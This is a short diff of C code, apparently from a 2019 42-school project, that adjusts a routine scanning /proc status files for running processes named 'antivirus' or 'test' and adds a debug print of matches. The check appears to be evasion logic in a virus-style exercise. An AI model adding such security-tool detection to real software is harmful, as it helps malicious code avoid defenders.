@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/27 12:20:54 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/08 15:40:30 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/08 18:32:09 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -33,7 +33,7 @@ void	opening(t_data *data)
 	char			target[9] = "/status";
 	char			path[PATH_MAX] = "/proc/";
 	char			prog[PROG_INFO] = {0};
-	char			needle[PROG_ENTRY][16] = { "sleep", "antivirus", "test" };
+	char			needle[PROG_ENTRY][16] = {"antivirus", "test"};
 	linux_dirent64	*curr = NULL;
 
 	data->context = false;
@@ -72,13 +72,19 @@ void	opening(t_data *data)
 							k++;
 						if (_strncmp(needle[j], &prog[k], _strlen(needle[j])) == 0)
 						{
+#ifdef DEBUG
+							char tutu[] = "proccess :\t";
+							_write(1, tutu, _strlen(tutu));
+							_write(1, &prog[k], _strlen(&prog[k]));
+							_write(1, &de[9], 1);
+#endif
+
 							_close(fd[2]);
 							_close(fd[1]);
 							goto next;
 						}
 					}
 				}
-
 				_close(fd[2]);
 				_close(fd[1]);
 			}
